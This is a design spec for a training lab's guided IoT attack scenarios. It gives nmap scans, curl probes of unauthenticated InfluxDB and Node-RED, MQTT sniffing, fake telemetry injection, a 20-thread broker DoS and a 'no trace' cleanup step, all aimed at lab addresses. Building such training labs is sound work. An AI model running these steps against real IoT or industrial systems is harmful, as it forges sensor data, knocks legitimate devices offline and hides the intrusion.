# Attack Scenario Guide — Design Spec

## Overview

Three structured attack scenarios for the IoT InfraLab Cyber Attack Simulation tab. Each follows: **Info Search** → **Collect Info** → **Attack**. Hybrid format — narrative intro per scenario, table per phase.

Scenarios increase in complexity. New users start at 1, progress to 3.

---

## Scenario 1: MQTT Recon & Inject

**Level:** Beginner. **Goal:** Find MQTT broker, spy on live sensor topics, inject fake telemetry. Shows how anonymous MQTT enables eavesdropping + data forgery.

### Narrative

Mosquitto broker allows anonymous connections (intentionally vulnerable). This means anyone on the network can subscribe to all topics and learn what sensor data looks like — IDs, value ranges, profiles. Once you know the topic structure, you can publish your own messages pretending to be a real sensor.

### Phase 1 — Info Search

| Step | Command | What It Does | Expected Output | Est. Time |
|------|---------|--------------|-----------------|-----------|
| 1 | `sh -c nmap -sS -n -T5 -p 8086,1880,1883 --min-rate 5000 --max-retries 1 --host-timeout 5s 172.18.0.0/24` | Scan subnet for MQTT brokers | `1883/tcp open mqtt` on 1+ IPs | ~1s |
| 2 | `getent hosts <MQTT_IP>` | Resolve hostname of broker | `mosquitto` or `iot_broker` | <1s |

**Interpretation:** Host 172.18.0.6 = Mosquitto MQTT broker. Only broker on the network. Default config = no password required.

### Phase 2 — Collect Info

| Step | Command | What It Does | Expected Output | Est. Time |
|------|---------|--------------|-----------------|-----------|
| 3 | `python mqtt_sniff.py --broker mosquitto --timeout 10` | Subscribe to all topics (#), log all messages | Topic names + payloads: sensor IDs, value ranges, metadata, telemetry | ~10s |

**Interpretation:** Topics discovered (sample): `sensors/data`, `sensor/metadata`, `sensor/saved`. Metadata shows valid sensor IDs (e.g. `A_CNCMILL_01`), value ranges (e.g. `temperature: [10,40]`), and profiles (`normal`, `failing`, `erratic`). These are the exact patterns real sensors use.

### Phase 3 — Attack

| Step | Command | What It Does | Expected Output | Est. Time |
|------|---------|--------------|-----------------|-----------|
| 4 | `python mqtt_inject.py --broker mosquitto --topic sensors/data --value 9999` | Publish fake high-temperature reading to live topic | `Injection complete.` | ~2s |

**What happened:** Injected `{"temp": 9999, "fake_injection": true}` to same topic real sensors publish to. Grafana IoT dashboard shows anomalous spike. If Suricata IPS rules active, injection may be blocked (red `BLOCKED` alert in terminal).

**Success indicators:**
- InfluxDB receives the payload → visible in Grafana IoT dashboard (Temperature panel shows 9999 spike)
- Suricata alert in SOC dashboard if IPS rules match `fake_injection: true`

---

## Scenario 2: Multi-Service Recon & Probe

**Level:** Intermediate. **Goal:** Map all services on subnet, probe each for open endpoints, identify exploitable services.

### Narrative

Step 1 identifies which hosts run what services. Then probe each interesting service manually: InfluxDB API (no auth), Node-RED web UI (no auth), Grafana (default creds). This mimics real attacker behavior — scan first, then check each open door.

### Phase 1 — Info Search

| Step | Command | What It Does | Expected Output | Est. Time |
|------|---------|--------------|-----------------|-----------|
| 1 | `nmap -sS -n -T5 -p 8086,1880,1883,3000,3100 --min-rate 5000 172.18.0.0/24` | Scan subnet for 5 common ports | Open services by IP | ~1s |
| 2 | `nmap -sS -n -T5 -p- --min-rate 10000 172.18.0.<IP>` | Full port scan on interesting host | All open ports on target | ~5-10s per host |

**Interpretation:** Now you know which IP runs which service. Map:

| IP | Services |
|----|----------|
| 172.18.0.3 | InfluxDB (8086) |
| 172.18.0.6 | Mosquitto (1883, 9001) |
| 172.18.0.9 | Grafana (3000) |
| 172.18.0.25 | Node-RED (1880) |

### Phase 2 — Collect Info

| Step | Command | What It Does | Expected Output | Est. Time |
|------|---------|--------------|-----------------|-----------|
| 3 | `curl -s http://172.18.0.3:8086/ping` | Check InfluxDB health | HTTP 204 (no auth required) | ~1s |
| 4 | `curl -s http://172.18.0.25:1880/` | Check Node-RED web UI | HTML page (accessible) | ~1s |
| 5 | `curl -s http://172.18.0.9:3000/api/health` | Check Grafana | `{"database":"ok"}` (unauthorized access limited) | ~1s |
| 6 | `nmap -sV -p 1883 172.18.0.6` | Version detection on MQTT | `eclipse-mosquitto 2.x` | ~5s |

**Interpretation:**
- **InfluxDB**: API responds without auth. Can query/write data. Potential data exfiltration or injection point.
- **Node-RED**: HTTP server accessible. Editor on / may accept requests.
- **Grafana**: Health endpoint accessible. Requires real auth for data.

### Phase 3 — Attack

| Step | Command | What It Does | Expected Output | Est. Time |
|------|---------|--------------|-----------------|-----------|
| 7 | `python mqtt_inject.py --broker mosquitto --topic sensors/data --value 9999` | Inject fake sensor data | `Injection complete.` | ~2s |
| 8 | `curl -s http://172.18.0.3:8086/query?db=sensor_data --data-urlencode "q=SELECT%20*%20FROM%20sensor_metrics%20LIMIT%201"` | Probe InfluxDB for data | JSON with stored metric row | ~1s |

**Success indicators:**
- InfluxDB returns sensor data without auth
- Fake inject appears in Grafana IoT dashboard
- Node-RED returns HTML (further exploitation possible via editor)

---

## Scenario 3: Full Killchain

**Level:** Advanced. **Goal:** Execute complete attack lifecycle — recon → wire sniff → application sniff → inject → DoS → clean up. Demonstrates every stage a real adversary would follow.

### Narrative

This combines Scenarios 1 and 2 into a single end-to-end attack. Add wire-level sniffing with tcpdump to capture raw MQTT packets. Finish with application DoS and container cleanup. Run sequentially using the Scenario Builder's multi-step execution.

### Phase 1 — Info Search

| Step | Command | What It Does | Expected Output | Est. Time |
|------|---------|--------------|-----------------|-----------|
| 1 | `nmap -sS -n -T5 -p 1883,8086,1880,3000 --min-rate 5000 172.18.0.0/24` | Map all services | Open ports per IP | ~1s |
| 2 | `getent hosts mosquitto` | Confirm MQTT broker IP | `172.18.0.6 mosquitto` | <1s |

### Phase 2 — Collect Info

| Step | Command | What It Does | Expected Output | Est. Time |
|------|---------|--------------|-----------------|-----------|
| 3 | `tcpdump -i eth1 -c 20 port 1883 -X` | Capture raw MQTT packets (headers + payload hex dump) | MQTT CONNECT, PUBLISH, SUBSCRIBE packets | ~5-10s |
| 4 | `python mqtt_sniff.py --broker mosquitto --timeout 15` | Application-layer sniff of all MQTT topics | Decoded topic name + payload for each message | ~15s |

**Interpretation:**
- tcpdump shows raw TCP packets: MQTT CONNECT (rogue_sniffer client connecting), PUBLISH messages with payload bytes
- mqtt_sniff shows decoded: topic `sensor/metadata` → payload `{"temperature":[10,40]...}`

### Phase 3 — Attack

| Step | Command | What It Does | Expected Output | Est. Time |
|------|---------|--------------|-----------------|-----------|
| 5 | `python mqtt_inject.py --broker mosquitto --topic sensors/data --value 9999` | Inject false telemetry | `Injection complete.` | ~2s |
| 6 | `python mqtt_dos.py --broker mosquitto --threads 20 --duration 10` | Exhaust broker connection pool | `20 threads connected`, connection refused at end | ~10s |

**Interpretation:**
- Inject floods the data pipeline with fake telemetry → Grafana anomaly
- DoS opens 20 concurrent connections + floods publish → broker hit connection limit → new connections rejected → legitimate sensors can't connect

### Phase 4 — Cleanup

| Step | Custom Command | What It Does | Expected Output | Est. Time |
|------|---------------|--------------|-----------------|-----------|
| 7 | `docker rm -f iot_attacker_node` | Delete attacker container | Container removed, no trace | ~1s |

**Note:** This step can only run from the Scenario Builder (uses Docker API proxy). Inside the container, `docker` CLI is not available.

---

## Implementation Plan

### Files to Create/Modify

1. **CREATE** `docs/superpowers/specs/2026-06-07-attack-scenarios-design.md` — this spec ✓
2. **CREATE** `text/scenario-guide.md` — full markdown reference version
3. **MODIFY** `src/simulation/nodered/NodeRed_Data/flows.json` — update `al_guide_template` to add scenario guide section alongside existing guide
4. **MODIFY** `src/simulation/nodered/NodeRed_Data/flows.json` — add preset scenario buttons: "Load Scenario 1", "Load Scenario 2", "Load Scenario 3" that populate the scenario builder with the command list

### Verification

1. `docker compose restart nodered`
2. Open Node-RED Dashboard → Cyber Attack Simulation tab
3. Scroll to guide section — verify all 3 scenarios displayed with correct commands
4. Run each scenario step-by-step in Custom Command
5. Verify expected outputs match

---

## Next Steps

1. User reviews this spec
2. Write implementation plan via writing-plans skill
3. Implement flows.json changes + scenario-guide.md
